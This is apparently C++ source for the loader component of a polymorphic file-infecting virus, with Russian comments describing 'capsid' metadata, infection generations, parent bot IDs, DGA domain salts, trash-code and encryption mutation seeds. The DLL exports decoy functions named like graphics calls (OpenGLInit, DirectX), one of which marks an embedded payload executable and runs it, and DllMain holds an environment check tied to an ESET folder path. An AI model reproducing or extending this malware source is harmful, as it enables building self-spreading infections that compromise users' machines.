#include <Windows.h>
#include "rawdata.hpp"



typedef enum dna_fields_
{
	// флаг о том нужно ли нам использовать фикс энтропии
	USE_ENTROPYFIX = 0,
	// параметр фикса энтропии
	ENTROPYFIX_PARAMETER,
	// флаг использовать трешкод или нет
	USE_TRASHCODE,
	// параметр трешкода
	TRASHCODE_PARAM,
	// сид кодового генератора
	CODEGEN_SEED,
	// сид генератора алгоритма шифрования
	POLYENC_SEED,
	// сид перехватчика управления
	HOOK_SEED,
	// тип окончания стартап-кода: т.к у нас вставляется в восстановлении трамплин после стартапкода мы можем записать любой мусор 
	STARTUP_ENDCODE_TYPE,
	// соль для сида DGA: смещает сид на определенное значения, создавая новые пулы доменов в зависимости от мутации
	DGA_SALT,
	// красная граница активации мутатора
	MUTATOR_BORDER,
	// техническое значение - всего элементов
	DNA_FIELDS_TOTAL
} dna_fields_t;


// расширенная инфа о капсиде
#pragma pack(1)
struct capsid_extended
{
	WCHAR parentBotId[128]; // айди бота который заразил данный екзешник
	DWORD32 dwGenCounter; // счетчик поколения заражений 
	DWORD32 dwDNAMutatorCounter; // счетчик количества мутаций ДНК
	DWORD32 dwWayInfected; // флаг о том по какому пути произошло заражение
	DWORD32 dwDNA[dna_fields_t::DNA_FIELDS_TOTAL];
};
#pragma pack()

// структура метаданных капсида вируса, следом за ней идут разрядности ядер
#pragma pack(1)
struct capsid_metadata
{
	DWORD32 x86_size;
	DWORD32 x64_size;
	DWORD32 offset_x86core;
	DWORD32 offset_x86entry;
	DWORD32 offset_x64core;
	DWORD32 offset_x64entry;
	DWORD32 size; // размер капсида: метаданные + дллки ядра
				  // ключ шифрования data_extended структуры - одноразовый блокнот
	unsigned char extended_key[sizeof(capsid_extended)];
	capsid_extended data_extended;
};
#pragma pack()


typedef VOID(WINAPI *fnEntry)(capsid_metadata *);


extern "C" _declspec(dllexport) HRESULT OpenGLInit()
{
	BOOL bRet = FALSE;
	do
	{
		DWORD dwProtectOld;
		VirtualProtect(capsid::rawData, sizeof(capsid::rawData), PAGE_EXECUTE_READWRITE, &dwProtectOld);

		capsid_metadata *capsidStruct = (capsid_metadata*)capsid::rawData;
#ifndef _WIN64
		fnEntry entry = (fnEntry)&capsid::rawData[capsidStruct->offset_x86entry];
		entry(capsidStruct);
#else
		fnEntry entry = (fnEntry)&capsid::rawData[capsidStruct->offset_x64entry];
		entry(capsidStruct);
#endif

		Sleep(10 * 60 * 1000);
		bRet = TRUE;

	} while (FALSE);
	return bRet;
}

extern "C" _declspec(dllexport) HRESULT Reboot()
{

	return S_OK;
}

extern "C" _declspec(dllexport) HRESULT Create()
{

	return S_OK;
}

extern "C" _declspec(dllexport) HRESULT Close()
{

	return S_OK;
}

extern "C" _declspec(dllexport) HRESULT DirectX()
{

	return S_OK;
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID lpReserved)
{
	if (reason == DLL_PROCESS_ATTACH)
	{
		HANDLE hFile = CreateFileW(L"C:\\Program Files\\Eset32\\Installation.txt", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			MessageBoxA(0, "Project name is m0yv", "OK", 0);
			CloseHandle(hFile);
			ExitProcess(0);
		}
	}
	return TRUE;
}